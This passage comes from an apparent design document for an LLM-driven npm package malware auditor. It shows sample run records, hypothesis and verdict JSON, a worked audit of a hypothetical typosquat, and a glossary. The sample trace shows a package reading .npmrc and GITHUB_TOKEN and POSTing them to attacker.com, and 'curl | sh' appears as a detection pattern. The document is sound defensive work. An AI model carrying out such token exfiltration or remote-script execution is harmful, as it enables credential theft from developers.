    "env": { "CI": "true", "NPM_TOKEN": "npm_FAKE_A1B2C3D4", "GITHUB_TOKEN": "ghp_fake_xyz" },
    "date": "2026-04-18T10:00:00Z",
    "plantFiles": [
      { "path": "/home/sandbox/.npmrc", "contentHash": "sha256:a1b2...ef" },
      { "path": "/home/sandbox/.ssh/id_rsa", "contentHash": "sha256:cc44...aa" }
    ],
    "stubUrls": [
      { "pattern": "http://attacker.com/*", "responseHash": "sha256:1234...78" }
    ],
    "hostname": "dev-machine",
    "locale": "en_US.UTF-8",
    "patches": [],
    "preload": null
  },
  "observe": { "kernel": true, "network": true, "fsDiff": true, "node": true },
  "wallMs": 742,
  "exitCode": 0,
  "timedOut": false,
  "events": [
    { "stream": "L4:monkey", "timestamp": 12000000, "pid": 42, "kind": "require",
      "raw": "cool-logger/index.js",
      "normalized": { "module": "cool-logger/index.js" } },
    { "stream": "L1:seccomp", "timestamp": 45000000, "pid": 42, "kind": "openat",
      "raw": "openat(AT_FDCWD, \"/home/sandbox/.npmrc\", O_RDONLY)",
      "normalized": { "path": "/home/sandbox/.npmrc", "flags": "O_RDONLY" },
      "derived": { "jsFrame": "lib/init.js:42", "module": "cool-logger" } },
    { "stream": "L4:v8inspector", "timestamp": 48000000, "pid": 42, "kind": "env_access",
      "raw": "process.env.GITHUB_TOKEN",
      "normalized": { "key": "GITHUB_TOKEN" },
      "derived": { "jsFrame": "lib/init.js:44" } },
    { "stream": "L2:pcap", "timestamp": 95000000, "pid": 42, "kind": "dns_query",
      "raw": "A? attacker.com",
      "normalized": { "host": "attacker.com", "type": "A" } },
    { "stream": "L1:seccomp", "timestamp": 102000000, "pid": 42, "kind": "connect",
      "raw": "connect(5, {AF_INET, 10.0.0.99:443})",
      "normalized": { "addr": "10.0.0.99", "port": 443 },
      "derived": { "jsFrame": "lib/init.js:58" } },
    { "stream": "L2:pcap", "timestamp": 108000000, "pid": 42, "kind": "http_request",
      "raw": "POST /collect HTTP/1.1\nHost: attacker.com\nContent-Length: 512\n...",
      "normalized": { "method": "POST", "host": "attacker.com", "path": "/collect", "bodyLen": 512 } }
  ],
  "stdoutHash": "sha256:1111...ff",
  "stderrHash": "sha256:2222...aa",
  "fsDiffHash": "sha256:3333...bb",
  "pcapHash":   "sha256:4444...cc",
  "eventSummary": {
    "uniqueHosts": ["attacker.com"],
    "uniqueSyscalls": ["openat", "read", "connect", "write"],
    "filesWritten": [],
    "dnsQueries": ["attacker.com"]
  },
  "contentHash": "sha256:feedbabe1234...",
  "createdAt": "2026-04-18T10:00:42Z"
}
```

### The `Hypothesis` that cites it

```json
{
  "hypId": "hyp_env_exfil_001",
  "description": "lib/init.js:42-58 reads .npmrc and GITHUB_TOKEN, then posts to attacker.com",
  "claim": {
    "kind": "env_exfil",
    "gating": null
  },
  "focusFiles": ["lib/init.js"],
  "focusLines": [{ "file": "lib/init.js", "range": "42-58" }],
  "parentHypId": null,
  "childHypIds": [],
  "state": "CONFIRMED",
  "createdBy": "triage",
  "evidenceRefs": [
    { "kind": "run", "id": "run_01HXYZ8A9BCD3E4F5G6H7J8K9M", "hash": "sha256:feedbabe1234..." }
  ],
  "resolvedAt": "2026-04-18T10:00:43Z",
  "resolution": {
    "reason": "Run under {CI=true, plantFiles=[.npmrc, id_rsa], stubUrls=[attacker.com]} observed openat(.npmrc), env.GITHUB_TOKEN access, and POST to attacker.com/collect in a single PID lineage, matching the claim exactly.",
    "by": "worker:experimenter"
  }
}
```

### The derived `Verdict`

```json
{
  "label": "PROVEN_DANGEROUS",
  "basis": {
    "confirmedIds": ["hyp_env_exfil_001"],
    "refutedIds": [],
    "inconclusiveIds": [],
    "unresolvedIds": []
  },
  "coverage": {
    "hypothesesEmitted": 1,
    "resolved": 1,
    "unresolved": 0,
    "staticCoveragePct": 100,
    "reason": null
  }
}
```

Note the chain of custody: `Verdict.basis.confirmedIds → hyp_env_exfil_001 → run_01HXYZ...` → the raw pcap/syscall/stdout blobs under `artifacts/<hash>/`. No prose intermediary; every link is hash-verifiable.

---

## Appendix C: How an audit actually runs — a worked walkthrough

A step-through of a full audit from CLI invocation to verdict on disk, using a hypothetical typosquat `cool-logger`. SSE events stream throughout to the dashboard.

### Act 1 — resolve and size up

The user runs `npx npmguard-cli install cool-logger`. The CLI queries the engine for an existing report; finding none, the payment gate runs. On success the engine starts a new audit.

The engine fetches the tarball and unpacks it. A cheap structural scan runs with no LLM: `curl ... | sh` in an install script → dealbreaker, `PROVEN_DANGEROUS`, done. Suspicious binary, minified install script, a script pointing to a missing file → flag. Most packages sail through with a couple of info-level flags.

**Intent extraction** then runs — one LLM call over README, description, keywords, dependency list. Output: `{statedPurpose, expectedCapabilities[]}`. A color library's expected capabilities are narrow; a logger legitimately needs NETWORK. This becomes the reference point for every downstream judgment.

### Act 2 — read every file

In parallel, for each source file, the engine makes an LLM call with three inputs: file contents, intent context, and structural flags for that file. The LLM emits **hypotheses** — structured claims. For `cool-logger`:

- `lib/init.js:42-58` reads `NPM_TOKEN` and `GITHUB_TOKEN` with no legitimate justification → `{kind: env_exfil}`
- `index.js:120` has `setInterval` posting to a URL built from env vars → `{kind: telemetry}`
- `utils/hex.js:10-50` holds a 4 KB hex blob fed into `Function` → `{kind: obfuscation}`

Each lands in the hypothesis graph. Zero hypotheses emitted across a package with full static coverage → `SAFE_ANALYZED` honestly, right here. No investigation needed.

### Act 3 — the orchestrator dispatches

An orchestrator agent reads the graph metadata (not raw tool output) and picks the next `OPEN` hypothesis. A code-level routing table maps `claim.kind` to worker kind:

- Static claims (`obfuscation`, "does A call B") → `code-reader` (read-only tools, 2-3 turns)
- Dynamic claims (`env_exfil`, gated kinds, `binary_drop`, etc.) → `experimenter` (runs the package)

Orchestrator configures the experimenter's setup with an LLM call — choosing env vars, dates, files to plant, URLs to stub — tailored to what the code actually checks.

### Act 4 — the whitebox experiment

The experimenter reads the suspected code before running anything. If `lib/init.js` says `if (process.env.CI)`, `CI=1` goes into setup. If it checks `Date.now() > 1800000000`, `faketime` fast-forwards. If it expects an IMDS response, the stub URL proxy returns what the malware wants. We read the code; we do not enumerate evasion surfaces speculatively.

The package then runs inside a hardened Docker container with five observation streams wired up:

- **L1** — kernel syscalls via seccomp-bpf (tamper-resistant ground truth)
- **L2** — network packets via `tcpdump` in the container's netns
- **L3** — filesystem diff via overlayfs snapshots
- **L4a** — monkey-patched Node APIs (JS-level backup semantics)
- **L4b** — V8 Inspector attached, correlating syscalls to JS frames

Fake credentials are planted (`.npmrc`, `id_rsa`, AWS keys); a stub server answers anything pointed at attacker domains. The package runs. All streams merge into one `RunArtifact`, content-hashed, blobs stored by hash.

The experimenter returns a structured resolution: state `CONFIRMED`, evidence ref pointing to the run, resolution reason citing specific observed syscalls. No prose; no self-report of confidence.

If behavior doesn't fire under the chosen conditions, the worker returns `INCONCLUSIVE` with a specific reason. The orchestrator may retry with different setup, reroute to a different worker, or mark `DEFERRED`.

### Act 5 — verdict and report

Once the graph is quiescent (all hypotheses resolved, or the overall budget is hit), the **verdict engine** — a pure function — reads the graph:

- Any CONFIRMED malicious → `PROVEN_DANGEROUS`
- No CONFIRMED but ≥1 INCONCLUSIVE suspicious → `SUSPICIOUS`
- All suspicious hypotheses REFUTED + coverage full → `SAFE_ANALYZED`
- Coverage thin (unresolved hypotheses, files triage couldn't read) → `UNDER_INVESTIGATED`

The verdict comes with a basis list citing specific hypothesis and evidence IDs. The report bundle lands on disk: `report.json` (small readable index) + `artifacts/<hash>/` (raw blobs: pcap, syscall logs, stdouts, applied patches). A Merkle root over `{evidence, hypotheses, verdict}` goes into the report. Changing any byte anywhere breaks the root.

### Act 6 — back to the user

SSE events have been firing the whole time — `triage_hypothesis_emitted`, `worker_dispatched`, `hypothesis_resolved`, `evidence_captured`, `verdict_reached`. The dashboard has filled in the graph live; the CLI streams a human-readable version.

When the verdict lands:

- `SAFE_ANALYZED` → install silently
- `PROVEN_DANGEROUS` → block; show the exact observed chain; `--force` overrides
- `SUSPICIOUS` → warn, cite the inconclusive hypotheses and why, prompt
- `UNDER_INVESTIGATED` → warn, show the coverage gap, prompt

The report is cached at `data/reports/cool-logger/1.0.4/`. Any future query for this version returns it without re-running the pipeline.

### The mental model, in one line

**Hypotheses are leads. Evidence is facts. Verdicts are pure derivations.** No LLM self-report appears in the chain of custody.

---

## Appendix D: Glossary

Terms used with specific meaning in this architecture. Where a term collides with general software usage, the distinction is called out.

| Term | Meaning |
|---|---|
| **Hypothesis** | A testable claim about behavior the package *might* exhibit. Emitted by triage or spawned by workers. Lives in the hypothesis graph with a state. |
| **Finding** | A Hypothesis in state `CONFIRMED`, `REFUTED`, or `INCONCLUSIVE`. Same data, different projection. Not a separate type. |
| **RunArtifact** | The immutable evidence record produced by one invocation of `runUnderObservation`. Content-hashed. The only citable evidence in v1. |
| **DifferentialArtifact** | v2. Diff of two RunArtifacts under different setups. Used for blackbox evasion detection when whitebox reading is insufficient. |
| **Event** | One observed behavior inside a RunArtifact (a syscall, a packet, an fs change, a JS API call). Carries `raw` (sensor-specific), `normalized` (queryable), and optionally `derived` (JS frame correlation). |
| **Evidence ref** | A typed reference `{kind, id, hash}` to an evidence record. The only way hypotheses point to evidence. |
| **Hypothesis graph** | The persistent tree/DAG of hypotheses for an audit. Central coordination artifact; written to `audit-log/graph.json` during a run. |
| **Worker** | A small focused LLM agent (`code-reader` or `experimenter` in v1) that resolves one hypothesis at a time with a narrow tool scope. |
| **Orchestrator** | The larger LLM agent managing the graph. Dispatches workers, merges duplicates, decides completion. Its context is graph metadata, never raw tool output. |
| **Setup** | The bundle of manipulations applied before a sandbox run — env, date, planted files, stubbed URLs, patches, preload. Captured verbatim in `RunArtifact.setupApplied`. |
| **Whitebox principle** | Design axiom: we have source code; we read it to derive trigger conditions rather than enumerate evasion surfaces speculatively. Separates this from generic malware sandboxes. |
| **Coverage** | Measurable numbers describing what was actually investigated: *static* (% of source files read), *hypothesis* (counts by state), *focus-area* (% of triage-emitted foci resolved). Required for any non-`UNDER_INVESTIGATED` verdict. |
| **Claim kind** | The taxonomy value describing what a hypothesis suspects (`env_exfil`, `binary_drop`, etc.). See Appendix A. |
| **Gating** | Optional modifier on a claim describing a suspected trigger condition (`time_gate`, `ci_gate`, etc.). |
| **Chain of custody** | The unbroken hash-linked path: `Verdict → Hypothesis → EvidenceRef (hash) → RunArtifact → raw blob in artifacts/`. No prose intermediaries at any link. |
| **Proven / Refuted** | Strong terms reserved for hypotheses backed by evidence refs. No LLM self-report can upgrade a hypothesis to these states; the schema enforces it. |
| **Reading aid** | A tool whose output informs the agent's next move but never becomes evidence. `evalJs` is the v1 example — used for decoding obfuscated strings, never cited in a finding. |
| **Dealbreaker** | A Phase 2 inventory check so clearly malicious it short-circuits the pipeline straight to `PROVEN_DANGEROUS` without running the LLM layers. Examples: `curl \| sh` in scripts, missing referenced files. |
